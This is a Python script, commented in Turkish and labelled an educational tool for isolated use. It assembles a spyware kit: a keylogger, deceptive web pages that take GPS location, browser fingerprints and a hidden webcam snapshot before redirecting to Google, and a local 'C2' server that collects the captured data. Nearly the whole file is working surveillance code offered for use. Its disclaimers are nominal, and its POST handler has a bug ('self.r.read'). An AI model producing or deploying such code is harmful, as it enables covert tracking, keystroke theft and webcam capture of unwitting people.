#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ULTIMATE EĞİTİM ARACI - TEK DOSYA
Sadece kendi izole ortamınızda kullanın!
Gerçek hedeflere karşı KULLANMAYIN!
"""

import os
import sys
import json
import time
import base64
import socket
import platform
import subprocess
import threading
import webbrowser
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ==================== KONUM ====================
def get_ip_location():
    try:
        import requests
        r = requests.get('http://ip-api.com/json/', timeout=5)
        return r.json()
    except:
        return {"hata": "IP konum alınamadı"}

def create_fake_gps_page():
    """HTML5 GeoLocation ile konum almak için geçici web sayfası"""
    html = """<!DOCTYPE html>
<html>
<head><title>Konum İzni</title></head>
<body>
<h2>Harita yükleniyor...</h2>
<script>
if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
        document.body.innerHTML = '<h2>Konum alındı, yönlendiriliyorsunuz...</h2>';
        setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
    });
} else {
    document.body.innerHTML = '<h2>Konum desteklenmiyor</h2>';
}
</script>
</body>
</html>"""
    with open("temp_gps.html", "w") as f:
        f.write(html)
    webbrowser.open("temp_gps.html")
    return "GPS sayfası açıldı (kullanıcı izin verirse konum alınır)"

# ==================== SİSTEM BİLGİLERİ ====================
def get_system_info():
    info = {
        "timestamp": str(datetime.now()),
        "hostname": socket.gethostname(),
        "kullanici": os.getlogin(),
        "os": platform.system() + " " + platform.release(),
        "islemci": platform.processor(),
        "makine": platform.machine(),
        "python_version": sys.version,
        "calistigi_dizin": os.getcwd()
    }
    
    # Windows ek bilgiler
    if platform.system() == "Windows":
        try:
            import wmi
            c = wmi.WMI()
            for proc in c.Win32_Processor():
                info["cpu"] = proc.Name
            for disk in c.Win32_LogicalDisk():
                info[f"disk_{disk.DeviceID}"] = f"{disk.Size} bytes free: {disk.FreeSpace}"
        except:
            info["wmi_not"] = "WMI modülü yok, pip install wmi"
    
    return info

# ==================== TARAYICI PARMAK İZİ ====================
def get_browser_fingerprint():
    """Basit bir JavaScript ile tarayıcı bilgilerini topla"""
    html = """<!DOCTYPE html>
<html>
<head><title>Fingerprint</title></head>
<body>
<script>
const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    cookieEnabled: navigator.cookieEnabled,
    screenWidth: screen.width,
    screenHeight: screen.height,
    colorDepth: screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    localStorage: typeof localStorage !== 'undefined'
};
fetch('/save_fingerprint', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
});
</script>
<h2>Bilgiler toplanıyor...</h2>
<script>setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);</script>
</body>
</html>"""
    with open("temp_fingerprint.html", "w") as f:
        f.write(html)
    webbrowser.open("temp_fingerprint.html")
    return "Tarayıcı parmak izi sayfası açıldı"

# ==================== WEBCAM FOTOĞRAFI ====================
def webcam_capture():
    html = """<!DOCTYPE html>
<html>
<head><title>Kamera</title></head>
<body>
<h2>Kamera başlatılıyor...</h2>
<video id="video" autoplay style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<script>
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    const video = document.getElementById('video');
    video.srcObject = stream;
    video.onloadedmetadata = () => {
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photo = canvas.toDataURL('image/jpeg');
        fetch('/save_photo', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ photo: photo })
        });
        stream.getTracks().forEach(track => track.stop());
        document.body.innerHTML = '<h2>Fotoğraf alındı, yönlendiriliyor...</h2>';
        setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
    };
})
.catch(err => { document.body.innerHTML = '<h2>Kamera erişimi reddedildi veya yok</h2>'; });
</script>
</body>
</html>"""
    with open("temp_webcam.html", "w") as f:
        f.write(html)
    webbrowser.open("temp_webcam.html")
    return "Webcam sayfası açıldı (izin gerektirir)"

# ==================== KEYLOGGER (local) ====================
class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.running = False
    
    def start(self):
        if platform.system() == "Windows":
            try:
                from pynput import keyboard
                self.running = True
                def on_press(key):
                    with open(self.log_file, "a") as f:
                        f.write(str(key) + "\n")
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                return "Keylogger başlatıldı (pynput gerekli)"
            except ImportError:
                return "pynput kurulu değil: pip install pynput"
        else:
            return "Keylogger sadece Windows test için"

# ==================== C2 SERVER (LOCAL) ====================
captured_data = []

class CaptureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/save_location'):
            from urllib.parse import urlparse, parse_qs
            query = parse_qs(urlparse(self.path).query)
            lat = query.get('lat', [''])[0]
            lon = query.get('lon', [''])[0]
            captured_data.append({"type": "gps", "lat": lat, "lon": lon, "time": str(datetime.now())})
            self.send_response(200)
        elif self.path == '/save_fingerprint':
            self.send_response(200)
        else:
            self.send_response(404)
        self.end_headers()
    
    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.r.read(content_len)
        if self.path == '/save_fingerprint':
            try:
                data = json.loads(body)
                captured_data.append({"type": "fingerprint", "data": data, "time": str(datetime.now())})
            except: pass
        elif self.path == '/save_photo':
            try:
                data = json.loads(body)
                # Base64 fotoğrafı kaydet
                if 'photo' in data:
                    img_data = data['photo'].split(',')[1]
                    with open(f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg", "wb") as f:
                        f.write(base64.b64decode(img_data))
                    captured_data.append({"type": "photo", "saved": True, "time": str(datetime.now())})
            except: pass
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Sessiz

def start_c2_server():
    server = HTTPServer(('localhost', 8888), CaptureHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

# ==================== ANA MENÜ ====================
def show_menu():
    print("""
╔══════════════════════════════════════════════════════════╗
║      ULTIMATE EĞİTİM ARACI - TEK DOSYA (v2.0)          ║
║         SADECE KENDİ İZOLE ORTAMINIZDA KULLANIN         ║
╚══════════════════════════════════════════════════════════╝
[1] 📍 IP ile konum (ip-api.com)
[2] 🎯 HTML5 GPS (kullanıcı izniyle gerçek konum)
[3] 🖥️ Sistem bilgileri (OS, CPU, disk)
[4] 🌐 Tarayıcı parmak izi (fingerprint)
[5] 📸 Webcam fotoğraf çek (izinle)
[6] ⌨️ Keylogger başlat (local, pynput gerekli)
[7] 📡 TÜM VERİLERİ TOPLA (otomatik C2 ile)
[8] 📋 Toplanan verileri göster
[9] 🧹 Verileri temizle
[0] ❌ Çıkış
    """)

def main():
    c2_server = start_c2_server()
    print("[✓] Yerel C2 sunucusu başladı: http://localhost:8888")
    
    while True:
        show_menu()
        secim = input("Seçiminiz: ")
        
        if secim == "1":
            print(get_ip_location())
        elif secim == "2":
            print(create_fake_gps_page())
        elif secim == "3":
            print(json.dumps(get_system_info(), indent=2))
        elif secim == "4":
            print(get_browser_fingerprint())
        elif secim == "5":
            print(webcam_capture())
        elif secim == "6":
            kl = KeyLogger()
            print(kl.start())
        elif secim == "7":
            print("[*] Tüm veri toplama başlatılıyor...")
            print(get_ip_location())
            print(create_fake_gps_page())
            print(get_browser_fingerprint())
            print(get_system_info())
            print(webcam_capture())
            print("[✓] Tüm modüller tetiklendi. C2 sunucusu http://localhost:8888 adresinde dinliyor.")
        elif secim == "8":
            if captured_data:
                print("\n=== TOPLANAN VERİLER ===")
                print(json.dumps(captured_data, indent=2))
            else:
                print("Henüz veri toplanmadı.")
        elif secim == "9":
            captured_data.clear()
            print("Veriler temizlendi.")
        elif secim == "0":
            print("Çıkılıyor...")
            break
        else:
            print("Geçersiz seçim!")
        
        input("\nDevam etmek için Enter'a basın...")
        os.system('cls' if platform.system() == 'Windows' else 'clear')

if __name__ == "__main__":
    # Gereksinim kontrolü
    try:
        import requests
    except ImportError:
        print("requests modülü gerekli! pip install requests")
        sys.exit(1)
    
    print("⚠️ UYARI: Bu araç SADECE eğitim için kendi cihazınızda kullanılmalıdır!")
    print("Yasal sorumluluk tamamen kullanıcıya aittir.\n")
    time.sleep(2)
    main()
